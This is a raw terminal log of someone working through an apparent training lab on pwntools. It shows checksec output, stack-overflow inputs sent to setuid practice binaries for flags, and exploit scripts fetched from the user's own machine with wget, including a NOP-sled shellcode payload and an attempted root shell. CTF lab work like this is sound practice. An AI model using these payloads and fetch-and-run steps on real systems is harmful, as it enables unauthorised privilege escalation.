@@ -1,0 +1,339 @@
+Script started on 2025-05-08 12:39:09+03:00 [COMMAND="ssh buzz@pwntools.thm" TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="104" LINES="27"]
+The authenticity of host 'pwntools.thm (10.10.179.74)' can't be established.
+ED25519 key fingerprint is SHA256:s+GTNY+6iPIeezJnDWpHuYl+mribdlz0LZbS+E58NhU.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'pwntools.thm' (ED25519) to the list of known hosts.
+buzz@pwntools.thm's password: 
+Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-144-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Thu May  8 09:39:15 UTC 2025
+
+  System load:  0.82              Processes:           96
+  Usage of /:   54.9% of 8.79GB   Users logged in:     0
+  Memory usage: 32%               IP address for eth0: 10.10.179.74
+  Swap usage:   0%
+
+ * Super-optimized for small spaces - read how we shrank the memory
+   footprint of MicroK8s to make it the smallest full K8s around.
+
+   https://ubuntu.com/blog/microk8s-memory-optimisation
+
+0 updates can be applied immediately.
+
+
+Last login: Thu Jun 10 02:22:06 2021 from 10.0.2.12
+id  ]0;buzz@intro2pwn: ~[01;32mbuzz@intro2pwn[00m:[01;34m~[00m$ ls
+[0m[01;34mIntroToPwntools[0m  [01;34mpwndbg[0m
+]0;buzz@intro2pwn: ~[01;32mbuzz@intro2pwn[00m:[01;34m~[00m$ ls IntroToPwntools/
+[0m[01;34mIntroToPwntools[0m  note.txt
+]0;buzz@intro2pwn: ~[01;32mbuzz@intro2pwn[00m:[01;34m~[00m$ cd IntroToPwntools/
+]0;buzz@intro2pwn: ~/IntroToPwntools[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools[00m$ ls
+[0m[01;34mIntroToPwntools[0m  note.txt
+]0;buzz@intro2pwn: ~/IntroToPwntools[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools[00m$ cat note.txt 
+
+
+Dear buzz,
+Welcome to Intro to Pwntools!
+In this folder, you will find
+a wonderful adventure of 
+binary exploitation!
+
+Sincerely,
+dizmas
+
+]0;buzz@intro2pwn: ~/IntroToPwntools[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools[00m$ c[Kcd IntroToPwntools/
+]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools[00m$ ls
+[0m[01;34mchecksec[0m  [01;34mcyclic[0m  [01;34mnetworking[0m  [01;34mshellcraft[0m
+]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools[00m$ cd checksec
+]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools/checksec[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools/checksec[00m$ ls
+[0m[01;32mintro2pwn1[0m  [01;32mintro2pwn2[0m  test_checksec.c
+]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools/checksec[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools/checksec[00m$ which chc[Kecksec
+/usr/local/bin/checksec
+]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools/checksec[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools/checksec[00m$ file /usr/local/bin/checksec
+/usr/local/bin/checksec: Python script, ASCII text executable
+]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools/checksec[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools/checksec[00m$ less /usr/local/bin/checksec
+[?1049h[22;0;0t[?1h=#!/usr/bin/python
+# -*- coding: utf-8 -*-
+import re
+import sys
+from pwnlib.commandline.common import main
+if __name__ == '__main__':
+    sys.argv[0] = re.sub(r'(-script\.pyw|\.exe)?$', '', sys.argv[0])
+    sys.exit(main())
+[7m/usr/local/bin/checksec (END)[27m[K[K[?1l>[?1049l[23;0;0t]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools/checksec[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools/checksec[00m$ [37P(reverse-i-search)`':[C^C
+]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools/checksec[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools/checksec[00m$ ls ~/IntroToPwntools/[C[C[C-~/IntroToPwntools/l~/IntroToPwntools/ ~/IntroToPwntools/
+total 8
+drwxrwxr-x 6 buzz buzz 4096 May 19  2021 [0m[01;34mIntroToPwntools[0m
+-rw-r--r-- 1 root root  140 Jun  9  2021 note.txt
+]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools/checksec[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools/checksec[00m$ ls -l ~
+total 8
+drwxrwxr-x 4 buzz buzz 4096 Jun  9  2021 [0m[01;34mIntroToPwntools[0m
+drwxr-xr-x 9 root root 4096 Jun  9  2021 [01;34mpwndbg[0m
+]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools/checksec[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools/checksec[00m$ du -sh ~/IntroToPwntools
+592K	/home/buzz/IntroToPwntools
+]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools/checksec[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools/checksec[00m$ du -sh ~/IntroToPwntoolsls -l ~[K/IntroToPwntools/ess /usr/local/bin/checksecfile[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cless[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C
+[?1049h[22;0;0t[?1h=#!/usr/bin/python
+# -*- coding: utf-8 -*-
+import re
+import sys
+from pwnlib.commandline.common import main
+if __name__ == '__main__':
+    sys.argv[0] = re.sub(r'(-script\.pyw|\.exe)?$', '', sys.argv[0])
+    sys.exit(main())
+[7m/usr/local/bin/checksec (END)[27m[K[K[?1l>[?1049l[23;0;0t]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools/checksec[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools/checksec[00m$ checksec intro2pwn1
+[?25l[?1h=[6n[[1m[34m*[m] '/home/buzz/IntroToPwntools/IntroToPwntools/checksec/intro2pwn1'[K
+    Arch:     i386-32-little[K
+    RELRO:    [32mFull RELRO[m[K
+    Stack:    [32mCanary found[m[K
+    NX:       [32mNX enabled[m[K
+    PIE:      [32mPIE enabled[m[K
+[?12l[?25h[?1l> ]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools/checksec[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools/checksec[00m$ checksec --version
+[?25l[?1h=[6nusage: pwn [-h][K
+           {asm,checksec,constgrep,cyclic,debug,disasm,disablenx,elfdiff,elfpatch,errno,hex,phd,pwnstrip,scramble,shellcraft,template,unhex,update,version}[K
+           ...[K
+pwn: error: unrecognized arguments: --version[K
+[?12l[?25h[?1l> ]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools/checksec[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools/checksec[00m$ pwn checksec --version
+[?25l[?1h=[6nusage: pwn [-h][K
+           {asm,checksec,constgrep,cyclic,debug,disasm,disablenx,elfdiff,elfpatch,errno,hex,phd,pwnstrip,scramble,shellcraft,template,unhex,update,version}[K
+           ...[K
+pwn: error: unrecognized arguments: --version[K
+[?12l[?25h[?1l> ]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools/checksec[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools/checksec[00m$ cd ..
+]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools[00m$ ls
+[0m[01;34mchecksec[0m  [01;34mcyclic[0m  [01;34mnetworking[0m  [01;34mshellcraft[0m
+]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools[00m$ cd cyclic/
+]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools/cyclic[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools/cyclic[00m$ ls
+alphabet  flag.txt  [0m[37;41mintro2pwn3[0m  test_cyclic.c
+]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools/cyclic[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools/cyclic[00m$ ls -l
+total 20
+-rw-rw-r-- 1 buzz   buzz    105 May 19  2021 alphabet
+-r--r----- 1 dizmas dizmas   22 May 19  2021 flag.txt
+-rwsrwxr-x 1 dizmas dizmas 7444 May 19  2021 [0m[37;41mintro2pwn3[0m
+-rw-rw-r-- 1 buzz   buzz    359 Jun 10  2021 test_cyclic.c
+]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools/cyclic[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools/cyclic[00m$ > attack
+]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools/cyclic[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools/cyclic[00m$ echo "b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaa6\x885\x04\x08'":[K > attack
+]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools/cyclic[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools/cyclic[00m$ ls
+alphabet  attack  flag.txt  [0m[37;41mintro2pwn3[0m  test_cyclic.c
+]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools/cyclic[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools/cyclic[00m$ ./intro2pwn3 < attack
+I run as dizmas.
+Segmentation fault (core dumped)
+]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools/cyclic[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools/cyclic[00m$ ./intro2pwn3 < attack[1@s[1@u[1@d[1@o[1@ 
+[sudo] password for buzz: 
+Sorry, user buzz is not allowed to execute './intro2pwn3' as root on intro2pwn.
+]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools/cyclic[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools/cyclic[00m$ > cyclic.[y[K[Kpy
+]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools/cyclic[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools/cyclic[00m$ nano [K[K[K[K[Kecho [K[K[K[K[Kwget http://10.9.1.59/cyclic.py 
+--2025-05-08 12:14:14--  http://10.9.1.59/cyclic.py
+Connecting to 10.9.1.59:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 143 [text/x-python]
+Saving to: ‘cyclic.py.1’
+
+cyclic.py.1                 0%[                                      ]       0  --.-KB/s               cyclic.py.1               100%[=====================================>]     143  --.-KB/s    in 0s      
+
+2025-05-08 12:14:15 (23.0 MB/s) - ‘cyclic.py.1’ saved [143/143]
+
+]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools/cyclic[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools/cyclic[00m$ ls
+alphabet  attack  cyclic.py  cyclic.py.1  flag.txt  [0m[37;41mintro2pwn3[0m  test_cyclic.c
+]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools/cyclic[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools/cyclic[00m$ python pwn_cyclic.py | ./intro2pwn3
+I run as dizmas.
+python: can't open file 'pwn_cyclic.py': [Errno 2] No such file or directory
+Who are you?: ]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools/cyclic[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools/cyclic[00m$ python pwn_cyclic.py | ./intro2pwn3[C[C[C[C^C
+]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools/cyclic[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools/cyclic[00m$ python cyclic.py | ./intro2pwn3
+I run as dizmas.
+Who are you?: ]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools/cyclic[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools/cyclic[00m$ ls -l
+total 28
+-rw-rw-r-- 1 buzz   buzz    105 May 19  2021 alphabet
+-rw-rw-r-- 1 buzz   buzz     53 May  8 12:11 attack
+-rw-rw-r-- 1 buzz   buzz      0 May  8 12:13 cyclic.py
+-rw-rw-r-- 1 buzz   buzz    143 May  8 12:13 cyclic.py.1
+-r--r----- 1 dizmas dizmas   22 May 19  2021 flag.txt
+-rwsrwxr-x 1 dizmas dizmas 7444 May 19  2021 [0m[37;41mintro2pwn3[0m
+-rw-rw-r-- 1 buzz   buzz    359 Jun 10  2021 test_cyclic.c
+]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools/cyclic[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools/cyclic[00m$ rm cyclic.py
+]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools/cyclic[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools/cyclic[00m$ mv cucl[K[K[Kyclic.py.1 cyclic.py
+]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools/cyclic[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools/cyclic[00m$ mv cyclic.py.1 cyclic.py[12Prm[C[C[C[C[C[C[C[C[C[C[7Pls -lpython cyclic.py | ./intro2pwn3
+I run as dizmas.
+Who are you?: Getting Flag:
+flag{13@rning_2_pwn!}
+]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools/cyclic[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools/cyclic[00m$ cd ..
+]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools[00m$ ls
+[0m[01;34mchecksec[0m  [01;34mcyclic[0m  [01;34mnetworking[0m  [01;34mshellcraft[0m
+]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools[00m$ cd networking/
+]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools/networking[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools/networking[00m$ ls
+note_to_buzz.txt  [0m[01;32mserve_test[0m  test_networking.c
+]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools/networking[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools/networking[00m$ lscd networking/ls[Kcd ..python cyclic.py | ./intro2pwn3[7Pmv cyclic.py.1 cyclic.py[12Prm[C[C[C[C[C[C[C[C[C[C[7Pls -lpython cyclic.py | ./intro2pwn3[4@pwn_[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cls[Kwget http://10.9.1.59/cyclic.py [21P> cyclic.pywget http://10.9.1.59/cyclic.py [21P> cyclic.pywget http://10.9.1.59/cyclic.py [C[1P[1P[1P[1P[1P[1P[1@g[1@e[1@t[C[1@.[1@f[1@l[1@a[1@g
+--2025-05-08 12:44:18--  http://10.9.1.59/get.flag.py
+Connecting to 10.9.1.59:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 223 [text/x-python]
+Saving to: ‘get.flag.py’
+
+get.flag.py                 0%[                                      ]       0  --.-KB/s               get.flag.py               100%[=====================================>]     223  --.-KB/s    in 0s      
+
+2025-05-08 12:44:19 (36.6 MB/s) - ‘get.flag.py’ saved [223/223]
+
+]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools/networking[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools/networking[00m$ python get.flag.py 
+[?25l[?1h=[6nOpening connection to 127.0.0.1 on port 1337[K
+[26;1HOpening connection to 127.0.0.1 on port 1337: Trying 127.0.0.1[K
+[J[26;1HOpening connection to 127.0.0.1 on port 1337: Done[K
+[J[26;1H[[1m[34m┤[m] Opening connection to 127.0.0.1 on port 1337: Done[K
+[J[26;1H[[1m[32m+[m] [27;1H[JGive me deadbeef: [K
+Thank you![K
+flag{n3tw0rk!ng_!$_fun}[K
+[[1m[34m*[m] Closed connection to 127.0.0.1 port 1337[K
+[?12l[?25h[?1l> ]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools/networking[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools/networking[00m$ cd ..
+]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools[00m$ ls
+[0m[01;34mchecksec[0m  [01;34mcyclic[0m  [01;34mnetworking[0m  [01;34mshellcraft[0m
+]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools[00m$ cd shellcraft/
+]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools/shellcraft[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools/shellcraft[00m$ 
+]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools/shellcraft[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools/shellcraft[00m$ ls
+[0m[01;32mdisable_aslr.sh[0m  [37;41mintro2pwnFinal[0m  note_to_buzz_2.txt  test_shellcraft.c
+]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools/shellcraft[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools/shellcraft[00m$ ls -l
+total 20
+-rwxrwxr-x 1 dizmas dizmas   49 May 19  2021 [0m[01;32mdisable_aslr.sh[0m
+-rwsrwxr-x 1 root   root   7236 May 19  2021 [37;41mintro2pwnFinal[0m
+-rw-rw-r-- 1 dizmas dizmas  233 May 19  2021 note_to_buzz_2.txt
+-rw-rw-r-- 1 buzz   buzz    191 Jun  9  2021 test_shellcraft.c
+]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools/shellcraft[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools/shellcraft[00m$ ls -l[Kcd shellcraft/ls[Kcd ..python get.flag.py [15@wget http://10.9.1.59/[C[C[C[C[C[C[C[C[C[C[C[C[C[1P[1P[1P[1P[1P[1P[1P[1P[1@e[1@x[1@p[1@l[1@o[1@i[1@t
+--2025-05-08 12:57:15--  http://10.9.1.59/exploit.py
+Connecting to 10.9.1.59:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 221 [text/x-python]
+Saving to: ‘exploit.py’
+
+exploit.py                  0%[                                      ]       0  --.-KB/s               exploit.py                100%[=====================================>]     221  --.-KB/s    in 0.003s  
+
+2025-05-08 12:57:16 (82.4 KB/s) - ‘exploit.py’ saved [221/221]
+
+]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools/shellcraft[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools/shellcraft[00m$ python exploit.py 
+[?25l[?1h=[6naaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaa��\xff\xff\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90�[K
+[?12l[?25h[?1l> ]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools/shellcraft[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools/shellcraft[00m$ ls
+[0m[01;32mdisable_aslr.sh[0m  exploit.py  [37;41mintro2pwnFinal[0m  note_to_buzz_2.txt  test_shellcraft.c
+]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools/shellcraft[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools/shellcraft[00m$ lspython exploit.py [15@wget http://10.9.1.59/[C[C[C[C[C[C[C[C[C[C[C[K[K[K[K[K[K[K[K[K[K[K[K/output
+--2025-05-08 12:58:07--  http://10.9.1.59/output
+Connecting to 10.9.1.59:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 4091 (4.0K) [application/octet-stream]
+Saving to: ‘output’
+
+output                      0%[                                      ]       0  --.-KB/s               output                    100%[=====================================>]   4.00K  --.-KB/s    in 0.008s  
+
+2025-05-08 12:58:07 (501 KB/s) - ‘output’ saved [4091/4091]
+
+]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools/shellcraft[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools/shellcraft[00m$ ./
+disable_aslr.sh  intro2pwnFinal   
+]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools/shellcraft[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools/shellcraft[00m$ ./intro2pwnFinal < output
+Hello There. Do you have an input for me?
+Segmentation fault (core dumped)
+]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools/shellcraft[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools/shellcraft[00m$ ./intro2pwnFinal < outputwget http://10.9.1.59/output[K[K[K[K[K[Kget.root.py
+--2025-05-08 12:59:20--  http://10.9.1.59/get.root.py
+Connecting to 10.9.1.59:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 424 [text/x-python]
+Saving to: ‘get.root.py’
+
+get.root.py                 0%[                                      ]       0  --.-KB/s               get.root.py               100%[=====================================>]     424  --.-KB/s    in 0s      
+
+2025-05-08 12:59:21 (65.7 MB/s) - ‘get.root.py’ saved [424/424]
+
+]0;buzz@intro2pwn: ~/IntroToPwntools/IntroToPwntools/shellcraft[01;32mbuzz@intro2pwn[00m:[01;34m~/IntroToPwntools/IntroToPwntools/shellcraft[00m$ python get.root.py 
+[?25l[?1h=[6nStarting local process './intro2pwnFinal'[K
+[26;1H[[1m[34m/.......[m] Starting local process './intro2pwnFinal'[K
+[J[26;12HStarting local process './intro2pwnFinal': pid 2707[K
+[J[26;1H[[1m[32m+[m] Starting local process './intro2pwnFinal': pid 2707[K
+[J[[1m[34m*[m] Switching to interactive mode[K
+[1m[31m$[m [27;3H[7m [m[J[27;3Hi[7m [m[J[27;3Hid[7m [m[J[27;3Hid[K
+[J[1m[31m$[m [27;3H[7m [m[J[27;1H[[1m[34m*[m] Got EOF while reading in interactive[K
+[1m[31m$[m [7m [m[J[27;3Hw[7m [m[J[27;3Hwh[7m [m[J[27;3Hwho[7m [m[J[27;3Hwhoa[7m [m[J[27;3Hwhoam[7m [m[J[27;3Hwhoami[7m [m[J[27;3Hwhoami[K
